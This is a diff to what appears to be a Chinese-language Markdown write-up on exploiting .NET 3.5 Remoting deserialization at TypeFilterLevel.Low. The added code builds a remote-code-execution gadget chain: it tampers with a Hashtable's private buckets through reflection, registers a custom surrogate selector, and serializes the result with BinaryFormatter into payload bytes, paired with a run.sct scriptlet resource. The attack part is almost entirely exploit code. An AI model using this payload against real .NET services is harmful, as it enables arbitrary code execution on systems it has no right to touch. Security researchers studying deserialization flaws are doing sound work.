@@ -391,7 +391,8 @@ public string xamlrcepayload(int asm_index)
 
 ## .NET 3.5 Remoting反序列化TypeFilterLevel.Low可行方法 ##
 ```
-
+      public List<object> GadgetChains()
+        {
                 string exedir = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
 
                 string scriptpath = Path.Combine(exedir, "run.sct");
@@ -428,6 +429,40 @@ public string xamlrcepayload(int asm_index)
                 ls.Add(pds);
                 ls.Add(verb);
                 ls.Add(dict);
+                
+            ht = new Hashtable();
+
+            // Add two entries to table.
+            /*
+            ht.Add(verb, "Hello");
+            ht.Add("Dummy", "Hello2");
+            */
+            ht.Add(verb, "");
+            ht.Add("", "");
+
+            FieldInfo fi_keys = ht.GetType().GetField("buckets", BindingFlags.NonPublic | BindingFlags.Instance);
+            Array keys = (Array)fi_keys.GetValue(ht);
+            FieldInfo fi_key = keys.GetType().GetElementType()
+                .GetField("key", BindingFlags.Public | BindingFlags.Instance);
+            for (int i = 0; i < keys.Length; ++i)
+            {
+                object bucket = keys.GetValue(i);
+                object key = fi_key.GetValue(bucket);
+                if (key is string)
+                {
+                    fi_key.SetValue(bucket, verb);
+                    keys.SetValue(bucket, i);
+                    break;
+                }
+            }
+
+            fi_keys.SetValue(ht, keys);
+
+            ls.Add(ht);
+
+            return ls;
+        }
+
   public class MySurrogateSelector : SurrogateSelector
     {
         public override ISerializationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector)
@@ -453,6 +488,12 @@ public string xamlrcepayload(int asm_index)
         }
 
     }
+object gadget = GadgetChains();
+System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt =
+new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
+fmt.SurrogateSelector = new MySurrogateSelector();
+fmt.Serialize(stm, gadget);
+byte[] payloadInByte = stm.ToArray();
 ```
 run.sct加入资源文件
 ```
